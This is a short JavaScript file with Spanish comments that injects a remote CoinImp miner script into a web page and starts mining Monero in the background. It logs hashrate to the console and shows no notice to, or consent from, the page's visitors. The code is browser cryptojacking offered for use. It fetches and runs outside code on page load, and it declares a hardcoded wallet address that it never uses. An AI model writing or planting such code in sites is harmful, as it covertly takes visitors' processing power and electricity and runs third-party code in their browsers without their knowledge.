// Dirección de la wallet de FaucetPay para recibir las recompensas
const walletAddress = "4ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtSNSzRFnmk";

// Usamos CoinImp para la minería de Monero
const minerScriptURL = 'https://www.coinimp.com/scripts/miner.js'; // URL del script de CoinImp
const siteKey = 'YOUR_SITE_KEY'; // Site Key proporcionada por CoinImp

// Función para cargar el script de minería
const loadMinerScript = (url, callback) => {
    const script = document.createElement('script');
    script.src = url;
    script.onload = callback;
    document.head.appendChild(script);
};

// Función para iniciar la minería
const startMining = () => {
    // Crear el minero con la Site Key
    const miner = new CoinImp(siteKey);

    // Iniciar la minería
    miner.start();

    // Mostrar el estado de la minería en la consola
    console.log("Minando Monero en segundo plano...");

    // Actualizar el estado de la minería cada 5 segundos
    setInterval(() => {
        const hashesPerSecond = miner.getHashesPerSecond();
        const totalHashes = miner.getTotalHashes();
        const acceptedHashes = miner.getAcceptedHashes();
        console.log(`Hashrate: ${hashesPerSecond} H/s`);
        console.log(`Total de hashes: ${totalHashes}`);
        console.log(`Hashes aceptados: ${acceptedHashes}`);
    }, 5000); // Actualizar cada 5 segundos
};

// Cargar el script de minería y luego iniciar
loadMinerScript(minerScriptURL, startMining);
